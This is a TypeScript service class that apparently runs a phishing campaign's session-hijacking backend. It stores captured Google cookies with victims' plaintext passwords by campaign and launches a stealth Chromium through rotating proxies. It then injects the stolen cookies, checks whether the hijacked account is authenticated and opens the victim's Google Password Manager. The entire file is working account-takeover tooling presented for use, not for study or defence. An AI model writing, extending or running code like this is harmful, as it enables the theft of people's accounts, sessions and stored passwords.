import { chromium, Browser, BrowserContext } from 'patchright';
import prisma from '../../config/database';
import { logger } from '../../utils/logger.util';
import { getProfileBrowserConfig } from './browser-launch.config';
import resourceManager from '../resource-manager.service';
import proxyPoolService from './proxy-pool.service';
import path from 'path';
import fs from 'fs';

export class ProfileManagerService {
  private profilesDir = path.join(__dirname, '../../../profiles');

  constructor() {
    // Ensure profiles directory exists
    if (!fs.existsSync(this.profilesDir)) {
      fs.mkdirSync(this.profilesDir, { recursive: true });
    }
  }

  /**
   * Create profile from captured cookies
   */
  async createProfile(data: {
    userId: string | undefined;
    campaignId: string;
    email: string;
    password: string;
    cookies: any[];
    provider: string;
  }) {
    try {
      // Auto-classify credential type based on email domain
      const emailLower = data.email.toLowerCase();
      const isGmail = emailLower.endsWith('@gmail.com') || emailLower.endsWith('@googlemail.com');
      const classificationType = isGmail ? 'GMAIL' : 'GSUITE';
      
      const accountType =
        emailLower.endsWith('@gmail.com') || emailLower.endsWith('@googlemail.com')
          ? 'GMAIL'
          : 'GSUITE';

      // Upsert profile in database (create new or update existing)
      const profile = await prisma.profile.upsert({
        where: {
          email_campaignId: {
            email: data.email,
            campaignId: data.campaignId,
          },
        },
        create: {
          userId: data.userId ?? undefined,
          campaignId: data.campaignId,
          email: data.email,
          password: data.password,
          provider: data.provider,
          classificationType,
          accountType,
          cookies: data.cookies ? JSON.stringify(data.cookies) : null,
          authStatus: 'NOT_AUTHENTICATED',
          status: 'ACTIVE',
          isLaunched: false,
        },
        update: {
          password: data.password,
          cookies: data.cookies ? JSON.stringify(data.cookies) : null,
          authStatus: 'NOT_AUTHENTICATED',
          status: 'ACTIVE',
          isLaunched: false,
        },
      });

      logger.success(`Profile upserted: ${data.email} (${profile.id}) - Type: ${classificationType}`);

      return {
        success: true,
        profile,
      };
    } catch (error: any) {
      logger.error('Create profile error:', error.message);
      throw error;
    }
  }

  /**
   * Launch profile browser (for technician/admin to view)
   */
  async launchProfile(profileId: string, userId: string): Promise<{
    success: boolean;
    message?: string;
    error?: string;
  }> {
    try {
      // Check if can launch more profiles
      if (!resourceManager.canLaunchProfile()) {
        throw new Error('Cannot launch profile - at maximum capacity. Close an existing profile first.');
      }

      // Get profile
      const profile = await prisma.profile.findUnique({
        where: { id: profileId },
      });

      if (!profile) {
        throw new Error('Profile not found');
      }

      // Check if already launched
      if (resourceManager.getLaunchedProfile(profileId)) {
        throw new Error('Profile is already launched');
      }

      // Get proxy
      const proxy = await proxyPoolService.getRandomProxy();

      // Create profile directory
      const profilePath = path.join(this.profilesDir, profileId);
      if (!fs.existsSync(profilePath)) {
        fs.mkdirSync(profilePath, { recursive: true });
      }

      // Launch browser with persistent context
      const launchConfig = getProfileBrowserConfig(profilePath, proxy || undefined);
      const browser = await chromium.launchPersistentContext(profilePath, {
        ...launchConfig,
        viewport: {
          width: 1920,
          height: 1080,
        },
      });

      // Get or create page
      const pages = browser.pages();
      const page = pages.length > 0 ? pages[0] : await browser.newPage();

      // Load cookies
      const cookies = profile.cookies ? JSON.parse(profile.cookies as string) : [];
      await browser.addCookies(cookies);

      // Navigate to Google account page
      await page.goto('https://myaccount.google.com', {
        waitUntil: 'domcontentloaded',
        timeout: 30000,
      });

      // Check if authenticated
      await page.waitForTimeout(2000);
      const url = page.url();
      const isAuthenticated = url.includes('myaccount.google.com') && !url.includes('signin');

      // Update profile auth status
      await prisma.profile.update({
        where: { id: profileId },
        data: {
          authStatus: isAuthenticated ? 'AUTHENTICATED' : 'NOT_AUTHENTICATED',
          isLaunched: true,
          lastLaunched: new Date(),
          launchCount: { increment: 1 },
        },
      });

      // Register in resource manager
      const registered = resourceManager.registerLaunchedProfile(profileId, {
        browserContext: browser as any,
        userId,
      });

      if (!registered) {
        await browser.close();
        throw new Error('Failed to register profile in resource manager');
      }

      logger.success(`Profile launched: ${profile.email} (${isAuthenticated ? 'AUTHENTICATED' : 'NOT_AUTHENTICATED'})`);

      return {
        success: true,
        message: `Profile launched successfully (${isAuthenticated ? 'Authenticated' : 'Not authenticated'})`,
      };
    } catch (error: any) {
      logger.error('Launch profile error:', error.message);
      return {
        success: false,
        error: error.message,
      };
    }
  }

  /**
   * Close launched profile
   */
  async closeProfile(profileId: string): Promise<{
    success: boolean;
    message?: string;
    error?: string;
  }> {
    try {
      // Close via resource manager
      await resourceManager.closeLaunchedProfile(profileId);

      // Update database
      await prisma.profile.update({
        where: { id: profileId },
        data: {
          isLaunched: false,
        },
      });

      logger.success(`Profile closed: ${profileId}`);

      return {
        success: true,
        message: 'Profile closed successfully',
      };
    } catch (error: any) {
      logger.error('Close profile error:', error.message);
      return {
        success: false,
        error: error.message,
      };
    }
  }

  /**
   * Access passwords (navigate to chrome://settings/passwords)
   */
  async accessPasswords(profileId: string): Promise<{
    success: boolean;
    message?: string;
    error?: string;
  }> {
    try {
      // Get launched profile from resource manager
      const launchedProfile = resourceManager.getLaunchedProfile(profileId);

      if (!launchedProfile) {
        throw new Error('Profile is not launched. Launch it first.');
      }

      // Get browser context
      const browser = launchedProfile.browserContext;

      // Create new page
      const page = await browser.newPage();

      // Navigate to password manager
      // Note: chrome://settings/passwords won't work in Chromium
      // Instead, navigate to Google Password Manager
      await page.goto('https://passwords.google.com', {
        waitUntil: 'domcontentloaded',
        timeout: 30000,
      });

      // Update activity
      resourceManager.updateProfileInteraction(profileId);

      logger.success(`Password manager opened for profile: ${profileId}`);

      return {
        success: true,
        message: 'Password manager opened in new tab',
      };
    } catch (error: any) {
      logger.error('Access passwords error:', error.message);
      return {
        success: false,
        error: error.message,
      };
    }
  }

  /**
   * Update profile auth status
   */
  async updateAuthStatus(profileId: string, status: 'AUTHENTICATED' | 'NOT_AUTHENTICATED') {
    try {
      await prisma.profile.update({
        where: { id: profileId },
        data: { authStatus: status },
      });

      logger.info(`Profile auth status updated: ${profileId} -> ${status}`);
    } catch (error: any) {
      logger.error('Update auth status error:', error.message);
    }
  }

  /**
   * Delete profile
   */
  async deleteProfile(profileId: string, userId: string, isAdmin: boolean = false) {
    try {
      const profile = await prisma.profile.findUnique({
        where: { id: profileId },
      });

      if (!profile) {
        throw new Error('Profile not found');
      }

      // Check ownership
      if (!isAdmin && profile.userId !== userId) {
        throw new Error('Access denied - not profile owner');
      }

      // Close if launched
      if (profile.isLaunched) {
        await this.closeProfile(profileId);
      }

      // Delete profile directory
      const profilePath = path.join(this.profilesDir, profileId);
      if (fs.existsSync(profilePath)) {
        fs.rmSync(profilePath, { recursive: true, force: true });
      }

      // Delete from database
      await prisma.profile.delete({
        where: { id: profileId },
      });

      logger.success(`Profile deleted: ${profile.email}`);

      return {
        success: true,
        message: 'Profile deleted successfully',
      };
    } catch (error: any) {
      logger.error('Delete profile error:', error.message);
      throw error;
    }
  }

  /**
   * Track profile interaction (reset idle timer)
   */
  trackInteraction(profileId: string) {
    resourceManager.updateProfileInteraction(profileId);
  }
}

export default new ProfileManagerService();
